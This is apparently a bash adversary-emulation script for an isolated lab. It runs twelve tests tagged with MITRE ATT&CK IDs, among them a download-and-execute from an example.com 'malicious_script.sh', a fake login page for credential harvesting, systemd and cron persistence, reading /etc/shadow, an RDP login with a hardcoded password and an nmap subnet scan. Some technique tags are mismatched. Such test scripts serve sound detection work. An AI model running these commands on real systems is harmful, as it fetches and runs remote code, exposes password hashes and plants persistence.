#!/bin/bash
# Linux Attack Commands Test Script
# WARNING: Run in isolated test environment only!

# ========== Test 1: Simulate Spearphishing Attachment Delivery - Download & Execute ==========
# TTP: T1566.001 - Phishing
# Tactic: Initial Access
echo "Executing: Simulate Spearphishing Attachment Delivery - Download & Execute"
wget https://example.com/malicious_script.sh -O /tmp/malicious_script.sh && chmod +x /tmp/malicious_script.sh && /tmp/malicious_script.sh
echo "Cleanup: rm -f /tmp/malicious_script.sh"
# rm -f /tmp/malicious_script.sh
echo

# ========== Test 2: Simulate Spearphishing - Credential Harvesting Simulation ==========
# TTP: T1566.001 - Phishing
# Tactic: Initial Access
echo "Executing: Simulate Spearphishing - Credential Harvesting Simulation"
python3 -m http.server 8000 & echo -e '<html><body><h1>Login</h1><form action="/submit" method="POST"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button type="submit">Login</button></form></body></html>' > /tmp/login.html
echo "Cleanup: kill $(pgrep -f 'python3 -m http.server') && rm -f /tmp/login.html"
# kill $(pgrep -f 'python3 -m http.server') && rm -f /tmp/login.html
echo

# ========== Test 3: Simulate PowerShell execution using pwsh to list files ==========
# TTP: T1059.001 - PowerShell
# Tactic: Execution
echo "Executing: Simulate PowerShell execution using pwsh to list files"
pwsh -c "Get-ChildItem -Path /home/$USER"
echo "Cleanup: No cleanup is necessary, as the command only reads data."
# No cleanup is necessary, as the command only reads data.
echo

# ========== Test 4: Simulate PowerShell execution using pwsh to write to a file ==========
# TTP: T1059.001 - PowerShell
# Tactic: Execution
echo "Executing: Simulate PowerShell execution using pwsh to write to a file"
pwsh -c "'Hello, PowerShell on Linux!' | Out-File -FilePath /tmp/powershell_test.txt"
echo "Cleanup: rm /tmp/powershell_test.txt"
# rm /tmp/powershell_test.txt
echo

# ========== Test 5: Create a systemd service for persistence ==========
# TTP: T1547.001 - Registry Run Keys
# Tactic: Persistence
echo "Executing: Create a systemd service for persistence"
echo '[Unit]\nDescription=Test Service\nAfter=network.target\n\n[Service]\nExecStart=/bin/bash -c \'echo \"Hello, persistence!\" >> /tmp/persistence_test.txt\'\nType=oneshot\n\n[Install]\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/test_persistence.service && sudo systemctl enable test_persistence.service
echo "Cleanup: sudo systemctl disable test_persistence.service && sudo rm /etc/systemd/system/test_persistence.service && sudo systemctl reset-failed"
# sudo systemctl disable test_persistence.service && sudo rm /etc/systemd/system/test_persistence.service && sudo systemctl reset-failed
echo

# ========== Test 6: Add a cron job for persistence ==========
# TTP: T1547.001 - Registry Run Keys
# Tactic: Persistence
echo "Executing: Add a cron job for persistence"
echo '@reboot echo \"Cron persistence test!\" >> /tmp/cron_persistence_test.txt' | crontab -
echo "Cleanup: crontab -l | grep -v 'cron_persistence_test.txt' | crontab -"
# crontab -l | grep -v 'cron_persistence_test.txt' | crontab -
echo

# ========== Test 7: Dump Shadow File (Local User Passwords) ==========
# TTP: T1003 - OS Credential Dumping
# Tactic: Credential Access
echo "Executing: Dump Shadow File (Local User Passwords)"
cat /etc/shadow
echo "Cleanup: No cleanup is necessary as the command only reads a file."
# No cleanup is necessary as the command only reads a file.
echo

# ========== Test 8: Retrieve /etc/passwd File (Usernames and UIDs) ==========
# TTP: T1003 - OS Credential Dumping
# Tactic: Credential Access
echo "Executing: Retrieve /etc/passwd File (Usernames and UIDs)"
cat /etc/passwd
echo "Cleanup: No cleanup is necessary as the command only reads a file."
# No cleanup is necessary as the command only reads a file.
echo

# ========== Test 9: Simulate RDP connection attempt to a Windows host using `rdesktop` (failed) ==========
# TTP: T1021.001 - Remote Desktop Protocol
# Tactic: Lateral Movement
echo "Executing: Simulate RDP connection attempt to a Windows host using `rdesktop` (failed)"
rdesktop -g 1024x768 -u testuser -p 'P@sswOrd123' 192.168.1.100
echo "Cleanup: No specific cleanup is required. The `rdesktop` process will terminate after the connection attempt (successful or unsuccessful)."
# No specific cleanup is required. The `rdesktop` process will terminate after the connection attempt (successful or unsuccessful).
echo

# ========== Test 10: Simulate RDP port scan using `nmap` ==========
# TTP: T1021.001 - Remote Desktop Protocol
# Tactic: Lateral Movement
echo "Executing: Simulate RDP port scan using `nmap`"
nmap -p 3389 192.168.1.0/24
echo "Cleanup: No specific cleanup is required.  `nmap` leaves no artifacts on the system besides the generated scan results."
# No specific cleanup is required.  `nmap` leaves no artifacts on the system besides the generated scan results.
echo

# ========== Test 11: Simulate WMI-like activity using `wmic` on Linux via Wine (Simulated) ==========
# TTP: UNMAPPED - Windows Management Instrumentation
# Tactic: Execution
echo "Executing: Simulate WMI-like activity using `wmic` on Linux via Wine (Simulated)"
wine cmd /c "echo Hello from WMI Simulation | clip"
echo "Cleanup: No specific cleanup required. The clipboard data will be overwritten by the next copy operation. If Wine configuration includes file system redirection to the host, check for created files and remove them."
# No specific cleanup required. The clipboard data will be overwritten by the next copy operation. If Wine configuration includes file system redirection to the host, check for created files and remove them.
echo

# ========== Test 12: Simulate WMI-like activity (Querying System Information) using `powershell` via Wine (Simulated) ==========
# TTP: UNMAPPED - Windows Management Instrumentation
# Tactic: Execution
echo "Executing: Simulate WMI-like activity (Querying System Information) using `powershell` via Wine (Simulated)"
wine powershell -c "Get-ComputerInfo | Out-String | clip"
echo "Cleanup: No specific cleanup required. The clipboard data will be overwritten by the next copy operation. If Wine configuration includes file system redirection to the host, check for created files and remove them."
# No specific cleanup required. The clipboard data will be overwritten by the next copy operation. If Wine configuration includes file system redirection to the host, check for created files and remove them.
echo

